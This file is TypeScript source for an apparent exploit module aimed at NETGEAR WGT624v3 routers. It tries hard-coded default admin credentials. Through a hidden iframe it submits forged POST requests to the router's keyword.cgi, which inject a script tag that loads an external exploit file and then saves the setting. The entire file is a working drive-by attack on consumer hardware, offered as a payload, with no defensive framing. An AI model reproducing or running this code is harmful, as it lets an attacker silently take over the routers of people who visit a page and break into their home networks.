import {Promise} from "es6-promise";
import FingerprintResult from "../../../fingerprint/FingerprintResult";
import BasePayload from "../../BasePayload";
import BasicAuthCredential from "../../BasicAuthCredential";
import PromiseUtil from "../../../shared/PromiseUtil";

interface FormParam {
    name:string,
    value:string
}

class WGT624v3Payload extends BasePayload {
    private static CREDENTIALS_TO_TEST:BasicAuthCredential[] = [
        {username: 'admin', password: ''},
        {username: 'admin', password: 'password'},
        {username: 'admin', password: 'aapm'},
    ];

    constructor(fingerprintResult:FingerprintResult) {
        super(fingerprintResult);
    }

    isTarget():boolean {
        return (
            this.fingerprintResult.vendor === 'NETGEAR' &&
            this.fingerprintResult.hwVersion === 'WGT624v3'
        );
    }

    runPayload():Promise<any> {
        let injectTestPromiseFuncs = WGT624v3Payload.CREDENTIALS_TO_TEST.map((credentials:BasicAuthCredential) => {
            return () => this.tryInjectPayload(credentials);
        });

        return PromiseUtil.sequentially(injectTestPromiseFuncs);
    }

    private sendPostRequest(url:string, params:FormParam[]):Promise<any> {
        return new Promise((resolve) => {
            let frame:HTMLIFrameElement = document.createElement('iframe');
            let form:HTMLFormElement = document.createElement('form');

            params.forEach((param:FormParam) => {
                let field:HTMLInputElement = document.createElement('input');
                field.type = 'text';
                field.name = param.name;
                field.value = param.value;
                form.appendChild(field);
            });
            form.method = 'POST';
            form.action = url;
            frame.sandbox.add('allow-scripts', 'allow-same-origin', 'allow-forms');
            frame.style.display = 'none';
            frame.onload = () => {
                frame.contentDocument.body.appendChild(form);
                frame.onload = () => {
                    frame.remove();
                    resolve();
                };
                form.submit();
            };
            document.body.appendChild(frame);
        });
    }

    private tryInjectPayload(credentials:BasicAuthCredential):Promise<any> {
        let exploitSrc = document.location.href.replace('index.html', '') + 'netgear_WGT624v3.js';
        let keywordUrl = 'http://' + credentials.username + ':' + credentials.password + '@'
            + this.fingerprintResult.ip + '/keyword.cgi';

        let addKeywordParams:FormParam[] = [
            {name: 'skeyword', value: 'never'},
            {name: 'cfKeyWord_Domain', value: `<script src="${exploitSrc}"></script>`},
            {name: 'cfKeyWord_AddKeyword', value: 'Add+Keyword'},
            {name: 'bs_enable', value: '0'},
            {name: 'bs_trustedip_enable', value: '0'},
            {name: 'bs_trustedip', value: '192.168.1.0'}
        ];
        let saveKeywordsParams:FormParam[] = [
            {name: 'skeyword', value: 'never'},
            {name: 'cfKeyWord_Domain', value: ''},
            {name: 'wzWAN_IPFinish', value: 'Apply'},
            {name: 'bs_enable', value: '0'},
            {name: 'bs_trustedip_enable', value: '0'},
            {name: 'bs_trustedip', value: '192.168.1.0'}
        ];
        return this.sendPostRequest(keywordUrl, addKeywordParams)
            .then(() => this.sendPostRequest(keywordUrl, saveKeywordsParams));
    }
}

export default WGT624v3Payload;
